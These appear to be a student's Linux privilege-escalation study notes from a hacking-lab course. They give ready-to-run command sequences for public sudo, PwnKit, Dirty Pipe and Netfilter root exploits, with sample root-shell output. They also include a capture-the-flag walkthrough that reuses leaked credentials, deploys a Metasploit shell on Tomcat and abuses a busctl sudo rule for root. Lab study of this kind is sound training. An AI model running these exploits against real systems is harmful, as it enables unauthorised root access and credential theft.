**CVE-2021-3156**, also known as **Baron Samedit**, is a heap-based buffer overflow in vulnerable versions of `sudo`. The vulnerability existed for many years and can allow local privilege escalation to `root`. Affected versions include examples such as:

```text
sudo 1.8.31 → Ubuntu 20.04
sudo 1.8.27 → Debian 10
sudo 1.9.2  → Fedora 33
```

The exact vulnerable versions depend on the distribution and patch level.

| Step                           | Command                                                 | What to do                                                 |
| ------------------------------ | ------------------------------------------------------- | ---------------------------------------------------------- |
| **1. Check Sudo version**      | `sudo -V \| head -n1`                                   | Find the installed Sudo version.                           |
| **2. Check OS version**        | `cat /etc/lsb-release`                                  | Identify the exact operating system/version.               |
| **3. Get the PoC**             | `git clone https://github.com/blasty/CVE-2021-3156.git` | Download the public PoC according to the version exploit.  |
| **4. Enter directory**         | `cd CVE-2021-3156`                                      | Move into the exploit directory.                           |
| **5. Compile**                 | `make`                                                  | Build the exploit and malicious library.                   |
| **6. Check available targets** | `./sudo-hax-me-a-sandwich`                              | Run the PoC without a target to see supported OS versions. |
| **7. Select matching target**  | `./sudo-hax-me-a-sandwich 1`                            | Choose the target matching the OS.                         |
| **8. Confirm root**            | `id`                                                    | Check the resulting privileges.                            |

**Important:** The target number is **not universal**. Always compare the PoC's target list with the actual OS/Sudo/libc versions on the target.


## Attack Path 2 — CVE-2019-14287

**CVE-2019-14287** is a Sudo policy bypass affecting vulnerable Sudo versions below `1.8.28`.

When you run `sudo -l`, you see `(ALL, !root) /bin/ncdu`. This means you're allowed to run ncdu as any user _except_ root — that's why typing `sudo /bin/ncdu` gets blocked. Next, you look up **ncdu on GTFOBins** and learn that ncdu can open a shell for you (just press **`b`** while it's running). So the plan is simple: if you can start ncdu as root, the shell it opens will also be root. To get past the "not root" block, you use the old sudo bug (**CVE-2019-14287**): you run `sudo -u#-1 /bin/ncdu`, and the `-1` secretly turns into `0`, which is root — the block only looks for the word "root", so the number sneaks through. This trick only works on **sudo older than 1.8.28**, so check with `sudo -V` first. Once ncdu opens as root, press **`b`**, and you get a root shell (check with `id`). In short: **GTFOBins tells you ncdu can give a shell, and the `-u#-1` trick lets you run it as root even though the rule says you can't.**

| Step                          | What to do                                                | Command                        | Important note                                                    |
| ----------------------------- | --------------------------------------------------------- | ------------------------------ | ----------------------------------------------------------------- |
| **1. Check Sudo version**     | Determine whether Sudo may be vulnerable.                 | `sudo -V \| head -n1`          | CVE-2019-14287 affects vulnerable versions below `1.8.28`.        |
| **2. Check Sudo permissions** | See what commands the current user can execute with Sudo. | `sudo -l`                      | You need an applicable Sudo rule that allows command execution.   |
| **3. Use the negative UID**   | Exploit the vulnerable UID handling.                      | `sudo -u#-1 <allowed-command>` | On vulnerable Sudo versions, `-1` may be treated as UID `0`/root. |


---
---

# Section 24 - Polkit

**polkit** is a Linux authorization service that decides if a program is allowed to do something. Its tool **`pkexec`** works like `sudo` — it runs a command as another user or root (`pkexec -u root id`). The exploit is **CVE-2021-4034 ("PwnKit")**, a memory-corruption bug in `pkexec` that was hidden for 10+ years and affects basically every unpatched Linux. **No special sudo rule or permission is needed** — any local user can get root. You just download the PoC, compile it, and run it → instant root shell. 

| #   | Command                                                   | What it does                                                  |
| --- | --------------------------------------------------------- | ------------------------------------------------------------- |
| 1   | `pkexec --version` or `dpkg -l policykit-1`               | Check version — before the Jan 2022 patch = likely vulnerable |
| 2   | `git clone https://github.com/arthepsy/CVE-2021-4034.git` | Download the PoC                                              |
| 3   | `cd CVE-2021-4034 && gcc cve-2021-4034-poc.c -o poc`      | Compile it                                                    |
| 4   | `./poc`                                                   | Run it → root shell                                           |
| 5   | `id`                                                      | Confirm `uid=0(root)` (type `bash` if dropped into `sh`)      |

---
---

# Section 25 - Dirty Pipe

- **Dirty Pipe (CVE-2022-0847)** = a Linux **kernel** bug. This vulnerability allows a user to write to arbitrary files as long as he has read access to these files — including root-owned files.
- Affects kernels **5.8 → 5.17**. _No special permission/sudo rule needed_ — any local user can root the box.
- Classic use: edit `/etc/passwd` to remove root's password, or hijack a SUID binary → root shell.
- **Always check the kernel version first:** `uname -r` → if it's 5.8–5.17, it's a candidate.

PoC: [https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits) (gives two exploits after compiling).

---

## Attack

| #   | Command                                                                         | What it does                                            |
| --- | ------------------------------------------------------------------------------- | ------------------------------------------------------- |
| 1   | `uname -r`                                                                      | Check kernel is **5.8–5.17** (e.g. `5.13.0-46-generic`) |
| 2   | `git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git` | Download the PoC                                        |
| 3   | `cd CVE-2022-0847-DirtyPipe-Exploits && bash compile.sh`                        | Compile → gives `exploit-1` and `exploit-2`             |
| 4   | _(pick one below)_                                                              | Run the chosen exploit → root                           |

### Option A — `exploit-1` (easiest): overwrite /etc/passwd

Temporarily sets root's password and pops a root shell:

```
cry0l1t3@nix02:~$ ./exploit-1
Setting root password to "piped"...Done! 
Popping shell... (run commands now)

# id
uid=0(root) gid=0(root) groups=0(root)
```

### Option B — `exploit-2`: hijack a SUID binary

With the help of the 2nd exploit version (`exploit-2`), we can execute SUID binaries with root privileges. However, before we can do that, we first need to find these SUID binaries. Then we can choose a binary and pass one's full path to the exploit:

```
cry0l1t3@nix02:~$ find / -perm -4000 2>/dev/null

/usr/bin/sudo
/usr/bin/passwd...

cry0l1t3@nix02:~$ ./exploit-2 /usr/bin/sudo
[+] hijacking suid binary..
[+] popping root shell.. (dont forget to clean up /tmp/sh ;))
# id
uid=0(root) ...
```


___
---

# Section 27 - Netfilter


- **Netfilter** = the Linux **kernel** module behind firewalls (packet filtering, NAT, connection tracking). Tools like `iptables`/`nftables` plug into it.
- Several kernel bugs in Netfilter → **local root**, no special permission needed.
- Companies often run **old, unpatched kernels** in production (hard to upgrade) → these stay exploitable. Containers/Docker share the host kernel, so a vulnerable kernel is vulnerable _inside_ containers too.
- **Always start with `uname -r`** → match the kernel version to the right CVE.
- ⚠️ These are kernel exploits — **unstable, can crash the box** (may need a reboot). Use carefully.

## The 3 CVEs — match by kernel version

|CVE|Vulnerable kernels|Repo|
|---|---|---|
|**CVE-2021-22555**|2.6 – 5.11|`google/security-research`|
|**CVE-2022-25636**|5.4 – 5.6.10 (⚠️ can corrupt kernel, needs reboot)|`Bonfee/CVE-2022-25636`|
|**CVE-2023-32233**|up to 6.3.1 (nf_tables Use-After-Free)|`Liuk3r/CVE-2023-32233`|

## Exploitation (per CVE)

**Step 0 — always:** `uname -r` → pick the matching CVE below.

### CVE-2021-22555 (kernel 2.6 – 5.11)

```
cry0l1t3@ubuntu:~$ wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c

cry0l1t3@ubuntu:~$ gcc -m32 -static exploit.c -o exploit

cry0l1t3@ubuntu:~$ ./exploit

# id → uid=0(root)
```

### CVE-2022-25636 (kernel 5.4 – 5.6.10) — ⚠️ may crash, needs reboot

```
cry0l1t3@ubuntu:~$ git clone https://github.com/Bonfee/CVE-2022-25636.git

cry0l1t3@ubuntu:~$ cd CVE-2022-25636 && make

cry0l1t3@ubuntu:~$ ./exploit

# id → uid=0(root)
```

### CVE-2023-32233 (kernel up to 6.3.1)

Needs the `libmnl` / `libnftnl` libraries to compile:

```
cry0l1t3@ubuntu:~$ git clone https://github.com/Liuk3r/CVE-2023-32233

cry0l1t3@ubuntu:~$ cd CVE-2023-32233

cry0l1t3@ubuntu:~$ gcc -Wall -o exploit exploit.c -lmnl -lnftnl

cry0l1t3@ubuntu:~$ ./exploit

# [*] You've Got ROOT:-)  → id → uid=0(root)
```

---
---

# Section 28 - Security Audit

Lynis can provide additional security-related findings and configuration information.

```bash
./lynis audit system
```

This performs a security audit of the Linux system with Lynis.


---
---


# Skill Assessment 

> **Box:** Ubuntu 20.04.1 LTS (Focal Fossa) · kernel `5.4.0-45-generic` · sudo `1.8.31`
> Chain: `htb-student` → `barry` → `barry_adm` → `tomcat` → **root**. 5 flags.

---

## Flag 1 — hidden file in my own home

`history` showed a path, but it **didn't** actually contain `flag1.txt` (red herring — don't trust the path blindly). The hint said *enumerate as this user*, so I looked for **hidden files** owned by me:
```bash
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep htb-student
```
→ this revealed the real path to **flag1.txt**.

> **Note:** `sudo -l` as **htb-student** = nothing (no sudo rights). Only the very last user (tomcat) gets a sudo rule — so don't waste time here hoping for sudo.
> **Lesson:** when a path from `history` is a dead end, hunt hidden files (`.*`) for your user.

---

## Flag 2 — barry's file (can't read yet)

While enumerating I saw **barry** had flag2 in his home dir, but it was readable **only by barry**, not `htb-student`. So I needed to *become barry* first.

> **Note:** `sudo -l` still gave **nothing** here — no sudo path to abuse. That's a hint the way forward is **creds/enumeration**, not a sudo exploit.

### What I tried and FAILED (keep for the lesson)

The versions looked juicy:
- sudo `1.8.31` → vulnerable to **CVE-2021-3156** (Baron Samedit)
- `pkexec 0.105` → vulnerable to **CVE-2021-4034** (PwnKit)

So I cloned the exploit on my attack box and SCP'd it over:

```bash
scp -r /home/htb-ac-1094410/CVE-2021-3156 htb-student@10.129.235.16:/home/htb-student
```

❌ **Couldn't compile anything on the target** — `gcc`/`make` were missing/broken, and I **couldn't install them as any user** (no sudo/apt rights). And I was scared to copy *pre-compiled* binaries from my attack box — they could have a **version/arch mismatch** and just crash.

> **Lesson:** don't tunnel-vision on CVEs. **No compiler on the box + can't install one = source-based exploits are OUT.** That's a strong signal the intended path is enumeration/creds, not a kernel/sudo CVE. Enumerate first.

### What ACTUALLY worked — read barry's bash history

A simple look at another user's **bash history** saved loads of time:

```bash
cat /home/barry/.bash_history
```
→ it leaked SSH creds for **barry_adm** and the hostname `dmz1.inlanefreight.local`.

> **Lesson #1 of this box:** always read `.bash_history` of every user you can. Credentials hide there.

---

## Getting to barry → barry_adm

I had creds, so I tried logging in with `sshpass`:

```bash
sshpass -p 'i_l0ve_s3cur1ty!' ssh barry_adm@10.129.235.16
```

### My confusion (the DNS rabbit hole)
The history mentioned `dmz1.inlanefreight.local`, so I wasted time trying to resolve that hostname:
- `ip route` → confirmed the box reaches `10.129.0.0/16`
- `/etc/resolv.conf` → only showed `127.0.0.53` (the local stub, useless)
- tried `resolvectl` to find the real internal DNS → **no clue**

**Then I stopped overthinking.** I just SSH'd as **barry** to the **same IP** I already had, with the found password:

```bash
ssh barry@10.129.235.16
```
✅ It worked → **flag2**.

```
id
uid=1001(barry) gid=1001(barry) groups=1001(barry),4(adm)
```
> **Note:** `sudo -l` as **barry / barry_adm** = still nothing. No sudo rights for these users either — the `adm` group (not sudo) is the real lever here.

> **Lesson:** don't chase hostnames/DNS when you already have a working IP. Try the simple thing first.

---

## Flag 3 — the `adm` group trick

Notice barry is in the **`adm`** group. As the module taught: **`adm` group can read system logs in `/var/log`**. The flag was sitting right there:

```bash
cat /var/log/flag3.txt
```
✅ **flag3**.

> **Lesson:** check `id` → group membership. `adm` = read `/var/log`.

### Reading the logs for the next step (was confused what mattered)

`/var/log/syslog` had a lot — I wasn't sure what was relevant. The useful bits:

```
... CRON (root) ... /usr/lib/php/sessionclean ...      # cron noise, ignore
Apache Tomcat/9.0.31 (Ubuntu)                          # <-- Tomcat is running!
/etc/tomcat9/Catalina/localhost/manager.xml
/usr/share/tomcat9-admin/manager
```
> **Lesson:** in noisy logs, look for **services + config paths** (here: Tomcat). Ignore the routine cron lines.

---

## Flag 4 — Apache Tomcat Manager

Found the flag's location:

```bash
find / -type f -name "flag4.txt" -ls 2>/dev/null
# /var/lib/tomcat9/flag4.txt   (owned by tomcat, can't read as barry)
```

Tomcat runs on **8080**. Visiting `http://10.129.235.16:8080` said the manager app needs the `manager-gui` role, with users defined in `/etc/tomcat9/tomcat-users.xml`. barry (adm) could read that file:

```xml
<user username="tomcatadm" password="T0mc@t_s3cret_p@ss!" roles="manager-gui, ...">
```

→ Logged in at `http://10.129.235.16:8080/manager`, then used Metasploit to get a shell as the tomcat user:

```bash
msfconsole
use exploit/multi/http/tomcat_mgr_login   # (mgr_login → then deploy for a shell)
# set RHOSTS, RPORT 8080, HttpUsername tomcatadm, HttpPassword 'T0mc@t_s3cret_p@ss!'
```
✅ shell as **tomcat** → **flag4**.

> **Lesson:** leaked creds in `tomcat-users.xml` → Manager login → deploy a WAR / use MSF → shell as tomcat.

---

## Flag 5 (root) — sudo busctl via GTFOBins

Finally a user with a sudo right! (earlier users had none):

```bash
tomcat@nix03:/home$ sudo -l
User tomcat may run the following commands on nix03:
    (root) NOPASSWD: /usr/bin/busctl
```

Checked **GTFOBins** for `busctl` → it can spawn a shell. This worked:

```bash
sudo busctl --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
```

✅ **root!**

```bash
cd /root   # grab the final flag
```

> **Lesson:** `sudo -l` on EVERY user. One allowed binary + GTFOBins = root.

---

## Big takeaways (what I'd do faster next time)

| Mistake I made | Do this instead |
|----------------|-----------------|
| Tunnel-visioned on sudo/pkexec CVEs | Enumerate first; CVEs rarely the intended path if you can't compile |
| Tried to SCP/compile exploits for ages | Check `.bash_history` of every user **early** — creds hide there |
| Chased `dmz1` hostname via DNS | Use the working IP you already have; try the simple login first |
| Unsure which syslog lines mattered | Look for **services + configs** (Tomcat), ignore cron noise |

**The winning pattern:** enumerate → read bash_history → reuse creds → check `id` groups (`adm` → `/var/log`) → leaked service creds (Tomcat) → `sudo -l` + GTFOBins → root.
